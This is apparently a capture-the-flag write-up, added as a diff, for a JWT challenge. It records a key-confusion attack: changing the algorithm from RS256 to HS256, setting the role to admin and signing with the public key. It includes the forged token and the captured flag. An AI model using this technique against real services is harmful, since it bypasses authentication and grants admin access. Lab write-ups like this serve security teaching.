@@ -1,0 +1,35 @@
+Original
+
+Header
+```
+{
+  "typ": "JWT",
+  "alg": "RS256"
+}
+```
+
+Payload
+```
+{
+  "role": "guest",
+  "iat": 1619403704,
+  "nbf": 1619403704
+}
+```
+
+
+Source:
+	https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+
+None algorithm => Line 40 filter it
+
+
+HS256 -> Symmetric
+
+Change alg to HS256, role to admin, sign with public key
+
+php create_token.php
+	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTk0MDQ5NjEsIm5iZiI6MTYxOTQwNDk2MX0.qLUapSWFKuVO-E_pdHTcgLKzLOUFBgJZmZWMqrQKGaM
+
+Take it as cookie
+	S4CTF{7h3r3__iS_s733L_a_bUnch3__0u7_th3r3!!!}
